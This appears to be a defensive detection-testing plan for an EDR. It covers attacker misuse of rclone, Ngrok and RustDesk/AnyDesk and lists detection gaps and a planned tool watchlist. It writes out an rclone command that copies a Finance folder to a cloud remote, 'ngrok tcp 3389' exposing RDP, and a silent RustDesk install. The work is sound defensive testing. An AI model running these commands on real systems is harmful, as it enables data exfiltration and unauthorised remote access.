# Test: C2/egress — attacker utility tools (rclone / Ngrok / AnyDesk / RustDesk)

**The technique (research):** the Akira/CISA advisories consistently list the same
legitimate-tool trio for exfiltration and out-of-band access: **rclone** (mass exfil to
cloud storage), **Ngrok** (reverse tunnel exposing internal services / hiding C2), and
**AnyDesk/RustDesk** (RMM-grade persistent remote access — the
[Huntress rogue-RMM daisy-chain](https://www.huntress.com/blog/daisy-chaining-rogue-rmm-tools)
trend). All are signed, well-known utilities: allow-listing trusts them, and users rarely
question them. See [CISA AA24-109A tool list](https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a),
[Intel471 RMM hunting](https://www.intel471.com/blog/understanding-and-threat-hunting-for-rmm-software-misuse),
[LOLRMM project](https://lolrmm.io).

**Detections to implement later (filed in future-detections-research.md):**
`PROC-RMM-TOOL` / `PROC-EGRESS-TOOL` rules — process names + characteristic command lines
(`rclone ... :remote:`, `ngrok tcp 3389`, service names RustDesk/AnyDesk), keyed from the
LOLRMM list.

## Manual test (victim)

Download each tool's official binary (manual — only you should place attacker-adjacent
utilities), then exercise the benign patterns and watch the EDR:

**rclone** ([rclone.org](https://rclone.org)) — exfil shape, fully offline variant:
```powershell
# simulate the exfil posture against a LOCAL dir (nothing leaves the machine):
.\rclone.exe copy C:\Users\Public\intel C:\Users\Public\exfil-sim --transfers 4 -P
# real attack shape: rclone copy C:\Finance remote:bucket -q --ignore-existing
```

**Ngrok** ([ngrok.com](https://ngrok.com)) — reverse tunnel (needs a free account; lab
network only):
```powershell
.\ngrok.exe tcp 3389          # exposes RDP through ngrok's cloud - the CISA pattern
```

**RustDesk** ([rustdesk.com](https://rustdesk.com), open source — the most testable RMM):
```powershell
# portable mode = no install, runs from any folder:
.\rustdesk.exe                # expect: service install? portable = process only
# installed mode: .\rustdesk-*.exe /S  -> creates 'RustDesk' service (expect PERS-SERVICE)
```

**Expected vs gap:**

| Signal | Today |
|---|---|
| RustDesk installed-mode service | ✅ `EVT-7045` + `PERS-SERVICE` — generic |
| Any of these **processes running at all** | ❌ GAP — no named tool watchlist; a CCDC red team running RustDesk portable right now would be invisible |
| `ngrok tcp` / `rclone ... :remote:` command lines | ❌ GAP — no PROC rules |
| Outbound to ngrok/tunnel endpoints | ⚠️ flows appear in the sensor; nothing flags them |

**Fix when implemented:** a curated name list (rclone, ngrok, anydesk, rustdesk,
screenconnect, splashtop*, netsupport, level, atera, syncro…) as a `PROC-RMM-TOOL`
critical rule on process name + a service-name variant — the single cheapest way to
cover the 2026 RMM-abuse category.

**Cleanup:** uninstall RustDesk service if installed (`.\rustdesk.exe --uninstall`),
delete downloaded binaries and `exfil-sim`.
